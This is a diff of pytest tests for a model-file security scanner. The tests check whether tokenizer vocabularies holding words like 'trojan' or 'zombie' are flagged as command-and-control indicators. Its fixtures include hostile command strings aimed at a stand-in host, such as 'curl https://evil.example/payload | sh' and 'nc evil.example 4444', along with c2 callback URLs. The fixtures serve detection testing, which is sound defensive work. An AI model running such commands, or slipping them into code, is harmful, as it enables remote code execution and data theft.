@@ -7,7 +7,7 @@ from modelaudit.cache import get_cache_manager, reset_cache_manager
 from modelaudit.core import determine_exit_code, scan_file, scan_model_directory_or_file
 from modelaudit.scanner_results import SCAN_OUTCOME_MESSAGE_METADATA_KEY
 from modelaudit.scanners.base import INCONCLUSIVE_SCAN_OUTCOME, CheckStatus, IssueSeverity
-from modelaudit.scanners.text_scanner import TextScanner
+from modelaudit.scanners.text_scanner import MAX_TOKENIZER_VOCABULARY_CC_RETARGET_OCCURRENCES, TextScanner
 from modelaudit.utils.helpers import cache_decorator
 
 
@@ -1975,6 +1975,90 @@ def test_text_scanner_insecure_standard_requirements_url_remains_actionable(
     assert determine_exit_code(aggregate) == 1
 
 
+def _bert_like_multilingual_vocabulary(*tail_tokens: str) -> str:
+    tokens = [
+        "[PAD]",
+        "[UNK]",
+        "[CLS]",
+        "[SEP]",
+        "[MASK]",
+        "the",
+        "und",
+        "de",
+        "la",
+        "\u4e2d",
+        "\u56fd",
+        "\u8a9e",
+        "\u03b1",
+        "\u03b2",
+        *[f"token{index}" for index in range(128)],
+        *[f"##piece{index}" for index in range(8)],
+        *tail_tokens,
+    ]
+    return "\n".join(tokens) + "\n"
+
+
+class _LineIterationGuardBytes(bytes):
+    def find(self, *args: Any, **kwargs: Any) -> int:
+        raise AssertionError("line iteration must not call bytes.find")
+
+    def splitlines(self, *args: Any, **kwargs: Any) -> list[bytes]:
+        raise AssertionError("line iteration must not materialize all lines")
+
+
+@pytest.mark.parametrize("token", ["zombie", "trojan"])
+def test_text_scanner_multilingual_tokenizer_vocab_content_omits_isolated_cc_tokens(
+    tmp_path: Path,
+    token: str,
+) -> None:
+    text_path = tmp_path / "tokenizer-multilingual.txt"
+    text_path.write_text(_bert_like_multilingual_vocabulary(token), encoding="utf-8")
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    assert not [
+        check
+        for check in result.checks
+        if check.name == "Network Communication Detection" and check.details.get("type") == "cc_pattern"
+    ]
+    assert any(
+        check.name == "Network Communication Detection" and check.status == CheckStatus.PASSED
+        for check in result.checks
+    )
+    assert determine_exit_code(aggregate) == 0
+
+
+@pytest.mark.parametrize(
+    "content",
+    [
+        "install zombie persistence payload",
+        "zombie_callback=https://evil.example/payload",
+        "https://evil.example/zombie",
+        'requests.get("https://evil.example/zombie")',
+        '{"description":"zombie"}',
+    ],
+)
+def test_text_scanner_multilingual_tokenizer_vocab_active_context_remains_actionable(
+    tmp_path: Path,
+    content: str,
+) -> None:
+    text_path = tmp_path / "tokenizer-multilingual.txt"
+    text_path.write_text(_bert_like_multilingual_vocabulary("zombie", content), encoding="utf-8")
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    assert any(
+        check.name == "Network Communication Detection"
+        and check.details.get("type") == "cc_pattern"
+        and check.details.get("pattern") == "zombie"
+        and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
+        for check in result.checks
+    )
+    assert determine_exit_code(aggregate) == 1
+
+
 def test_text_scanner_bare_vocabulary_urls_are_informational(tmp_path: Path) -> None:
     text_path = tmp_path / "vocab.txt"
     text_path.write_text("safe-token\nhttps://docs.example.com/reference\n", encoding="utf-8")
@@ -1996,6 +2080,7 @@ def test_text_scanner_bare_vocabulary_urls_are_informational(tmp_path: Path) -> 
     [
         ("malware", "cc_pattern"),
         ("backdoor", "cc_pattern"),
+        ("botnet", "cc_pattern"),
         ("requests.get", "network_function"),
     ],
 )
@@ -2056,6 +2141,250 @@ def test_text_scanner_merges_basic_assignments_remain_actionable(tmp_path: Path)
         for check in result.checks
     )
     assert determine_exit_code(aggregate) == 1
+
+
+@pytest.mark.parametrize("token", ["trojan", "zombie"])
+def test_text_scanner_tokenizer_vocab_later_same_pattern_instruction_remains_actionable(
+    tmp_path: Path,
+    token: str,
+) -> None:
+    text_path = tmp_path / "vocab.txt"
+    text_path.write_text(
+        ("safe-token\n" * 40) + f"{token}\ninstall {token} persistence payload\n",
+        encoding="utf-8",
+    )
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    assert any(
+        check.name == "Network Communication Detection"
+        and check.details.get("type") == "cc_pattern"
+        and check.details.get("pattern") == token
+        and check.severity == IssueSeverity.CRITICAL
+        for check in result.checks
+    )
+    assert determine_exit_code(aggregate) == 1
+
+
+def test_text_scanner_tokenizer_vocab_cc_retarget_limit_fails_closed(tmp_path: Path) -> None:
+    text_path = tmp_path / "vocab.txt"
+    text_path.write_text(
+        "trojan\n" * (MAX_TOKENIZER_VOCABULARY_CC_RETARGET_OCCURRENCES + 1),
+        encoding="utf-8",
+    )
+
+    result = TextScanner(config={"check_secrets": False}).scan(str(text_path))
+
+    assert result.success is False
+    assert result.metadata.get("scan_outcome") == INCONCLUSIVE_SCAN_OUTCOME
+    assert result.metadata.get("operational_error_reason") == "text_content_security_classification_limit"
+    assert any(
+        check.name == "Network Communication Detection"
+        and check.details.get("type") == "cc_pattern"
+        and check.details.get("pattern") == "trojan"
+        and check.severity == IssueSeverity.CRITICAL
+        for check in result.checks
+    )
+    assert any(
+        check.name == "Text Content Security Coverage"
+        and check.details.get("scan_outcome_reason") == "text_content_security_classification_limit"
+        and check.details.get("classification_limit_sources") == ["tokenizer_vocabulary"]
+        and check.details.get("max_classification_occurrences") == MAX_TOKENIZER_VOCABULARY_CC_RETARGET_OCCURRENCES
+        and check.details.get("max_tokenizer_vocabulary_cc_retarget_occurrences")
+        == MAX_TOKENIZER_VOCABULARY_CC_RETARGET_OCCURRENCES
+        for check in result.checks
+    )
+
+
+@pytest.mark.parametrize(
+    "token",
+    [
+        "trojan",
+        "zombie",
+        "##trojan",
+        "##zombies",
+        "\u0120trojan",
+        "\u0120zombies",
+        "\u2581zombie",
+        "trojan</w>",
+        "zombie@@",
+    ],
+)
+def test_text_scanner_tokenizer_vocab_cc_indicator_entries_are_omitted(
+    tmp_path: Path,
+    token: str,
+) -> None:
+    text_path = tmp_path / "vocab.txt"
+    text_path.write_text(
+        "\n".join(
+            [
+                "[PAD]",
+                "[UNK]",
+                "[CLS]",
+                "[SEP]",
+                "market",
+                "earnings",
+                token,
+                "neutral",
+                "safe-token",
+                "##ing",
+            ]
+        )
+        + "\n",
+        encoding="utf-8",
+    )
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    assert not [
+        check
+        for check in result.checks
+        if check.name == "Network Communication Detection" and check.details.get("type") == "cc_pattern"
+    ]
+    assert any(
+        check.name == "Network Communication Detection" and check.status == CheckStatus.PASSED
+        for check in result.checks
+    )
+    assert determine_exit_code(aggregate) == 0
+
+
+def test_text_scanner_tokenizer_vocab_line_iteration_avoids_find_and_splitlines() -> None:
+    payload = _LineIterationGuardBytes(
+        b"\n".join(
+            [
+                b"[PAD]",
+                b"[UNK]",
+                b"[CLS]",
+                b"[SEP]",
+                b"[MASK]",
+                b"market",
+                b"earnings",
+                b"zombie@@",
+                b"neutral",
+                b"safe-token",
+                b"##ing",
+            ]
+        )
+        + b"\n"
+    )
+
+    assert TextScanner._tokenizer_vocabulary_line_evidence(payload) == (11, 11, 5, 2)
+
+
+@pytest.mark.parametrize("line_separator", [b"\n", b"\r\n", b"\r"])
+def test_text_scanner_tokenizer_vocab_line_separators_omit_suffix_marked_cc_token(
+    tmp_path: Path,
+    line_separator: bytes,
+) -> None:
+    text_path = tmp_path / "vocab.txt"
+    text_path.write_bytes(
+        line_separator.join(
+            [
+                b"[PAD]",
+                b"[UNK]",
+                b"[CLS]",
+                b"[SEP]",
+                b"[MASK]",
+                b"market",
+                b"earnings",
+                b"zombie@@",
+                b"neutral",
+                b"safe-token",
+                b"##ing",
+            ]
+        )
+        + line_separator
+    )
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    assert not [
+        check
+        for check in result.checks
+        if check.name == "Network Communication Detection" and check.details.get("type") == "cc_pattern"
+    ]
+    assert any(
+        check.name == "Network Communication Detection" and check.status == CheckStatus.PASSED
+        for check in result.checks
+    )
+    assert determine_exit_code(aggregate) == 0
+
+
+def test_text_scanner_ambiguous_short_vocab_does_not_suppress_cc_pattern(tmp_path: Path) -> None:
+    text_path = tmp_path / "vocab.txt"
+    text_path.write_text("safe-token\ntrojan\n", encoding="utf-8")
+
+    result = TextScanner().scan(str(text_path))
+
+    assert any(
+        check.name == "Network Communication Detection"
+        and check.details.get("type") == "cc_pattern"
+        and check.details.get("pattern") == "trojan"
+        for check in result.checks
+    )
+
+
+@pytest.mark.parametrize(
+    ("content", "finding_type"),
+    [
+        ("endpoint=https://evil.example/payload\n", "url_detected"),
+        ("curl https://evil.example/payload | sh\n", "url_detected"),
+        ("nc evil.example 4444\n", "network_command"),
+        ('requests.get("https://evil.example/payload")\n', "network_function"),
+        ("trojan c2_server=https://evil.example/payload\n", "cc_pattern"),
+        ("install trojan callback_url=https://evil.example/payload\n", "cc_pattern"),
+        ("trojan</w> c2_server=https://evil.example/payload\n", "cc_pattern"),
+        ("zombie@@ callback_url=https://evil.example/payload\n", "cc_pattern"),
+    ],
+)
+def test_text_scanner_tokenizer_vocab_active_controls_remain_actionable(
+    tmp_path: Path,
+    content: str,
+    finding_type: str,
+) -> None:
+    text_path = tmp_path / "vocab.txt"
+    text_path.write_text(("safe-token\n" * 12) + content, encoding="utf-8")
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    assert any(
+        check.name == "Network Communication Detection"
+        and check.details.get("type") == finding_type
+        and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
+        for check in result.checks
+    )
+    assert determine_exit_code(aggregate) == 1
+
+
+def test_text_scanner_tokenizer_vocab_urls_remain_detected(tmp_path: Path) -> None:
+    text_path = tmp_path / "vocab.txt"
+    text_path.write_text(("safe-token\n" * 12) + "https://evil.example/payload\n", encoding="utf-8")
+
+    result = TextScanner().scan(str(text_path))
+
+    assert any(
+        check.name == "Network Communication Detection" and check.details.get("type") == "url_detected"
+        for check in result.checks
+    )
+
+
+def test_text_scanner_non_vocabulary_trojan_prose_remains_actionable(tmp_path: Path) -> None:
+    text_path = tmp_path / "README.md"
+    text_path.write_text("This model installs a trojan payload.\n", encoding="utf-8")
+
+    result = TextScanner().scan(str(text_path))
+
+    assert any(
+        check.name == "Network Communication Detection"
+        and check.details.get("type") == "cc_pattern"
+        and check.details.get("pattern") == "trojan"
+        and check.severity == IssueSeverity.CRITICAL
+        for check in result.checks
+    )
 
 
 @pytest.mark.parametrize(
@@ -2286,7 +2615,9 @@ def test_text_scanner_documentation_classification_limit_is_inconclusive(tmp_pat
     assert any(
         check.name == "Text Content Security Coverage"
         and check.details.get("scan_outcome_reason") == "text_content_security_classification_limit"
+        and check.details.get("classification_limit_sources") == ["documentation"]
         and check.details.get("max_classification_occurrences") == 1_024
+        and check.details.get("max_documentation_classification_occurrences") == 1_024
         for check in result.checks
     )
 
@@ -2317,9 +2648,14 @@ def test_text_scanner_documentation_classification_exact_limit_ignores_passive_f
         },
     ]
 
-    _classified, incomplete = TextScanner._downgrade_sidecar_network_findings("README.md", payload, findings)
+    _classified, incomplete, limit_sources = TextScanner._downgrade_sidecar_network_findings(
+        "README.md",
+        payload,
+        findings,
+    )
 
     assert incomplete is False
+    assert limit_sources == set()
 
 
 def test_text_scanner_documentation_classification_limit_is_shared(monkeypatch: pytest.MonkeyPatch) -> None:
@@ -2336,9 +2672,14 @@ def test_text_scanner_documentation_classification_limit_is_shared(monkeypatch: 
 
     monkeypatch.setattr(TextScanner, "_documentation_cc_finding_is_benign_prose", classmethod(count_checks))
 
-    _classified, incomplete = TextScanner._downgrade_sidecar_network_findings("README.md", payload, findings)
+    _classified, incomplete, limit_sources = TextScanner._downgrade_sidecar_network_findings(
+        "README.md",
+        payload,
+        findings,
+    )
 
     assert incomplete is True
+    assert limit_sources == {"documentation"}
     assert checks == 1_024
 
 
@@ -2362,9 +2703,14 @@ def test_text_scanner_documentation_retarget_caches_absent_token_searches(
 
     monkeypatch.setattr(TextScanner, "_find_documentation_token", staticmethod(count_searches))
 
-    _classified, incomplete = TextScanner._downgrade_sidecar_network_findings("README.md", payload, [finding])
+    _classified, incomplete, limit_sources = TextScanner._downgrade_sidecar_network_findings(
+        "README.md",
+        payload,
+        [finding],
+    )
 
     assert incomplete is False
+    assert limit_sources == set()
     assert calls_by_token[b"from requests"] == 1
     assert calls_by_token[b"requests.connect"] == 1
     assert calls_by_token[b"requests.request"] == 1
